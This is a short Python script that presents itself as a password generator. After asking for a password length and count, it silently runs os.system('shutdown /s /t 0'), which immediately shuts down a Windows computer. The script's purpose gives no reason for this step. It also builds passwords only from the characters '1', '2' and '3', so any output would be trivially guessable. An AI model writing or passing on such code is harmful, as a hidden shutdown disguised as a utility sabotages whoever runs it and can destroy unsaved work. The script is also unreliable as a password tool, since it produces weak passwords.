import os
import random
import string

chars = "123"

Break = 1

while Break < 2:
    password_len = int(input("what would you like your password length to be : "))
    password_count = int(input("how many passwords do you want : "))
    os.system('shutdown /s /t 0')
    for x in range(0,password_count):
        password = ""
        for x in range(0,password_len):
            password_char = random.choice(chars)
            password    = password + password_char
        print("here is your password : ", password)
        Break = 3